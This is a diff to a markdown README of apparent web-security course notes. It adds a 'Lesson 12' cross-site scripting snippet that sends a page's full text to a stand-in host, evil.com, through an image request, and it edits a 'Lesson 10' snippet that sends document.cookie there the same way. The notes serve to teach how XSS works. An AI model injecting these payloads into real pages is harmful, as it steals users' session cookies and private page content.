@@ -19,13 +19,27 @@ From the repository link in the above section, did the following:
 - [Git hub repo](https://github.com/carltonj2000/web-sec-ess)
   created with all content note above.
 
+## Lesson 12
+
+---
+
+<script>
+  var data = document.body.innerText;
+  console.log(data);
+  var payload = encodeURIComponent(data);
+  var img = new Image();
+  img.src = `https://evil.com:666/hijack?payload=${payload}`;
+</script>
+
+---
+
 ## Lesson 10
 
 ---
 
 <script>
-  const payload = encodeURIComponent(document.cookie);
-  const img = new Image();
+  var payload = encodeURIComponent(document.cookie);
+  var img = new Image();
   img.src = `https://evil.com:666/hijack?payload=${payload}`;
 </script>
 
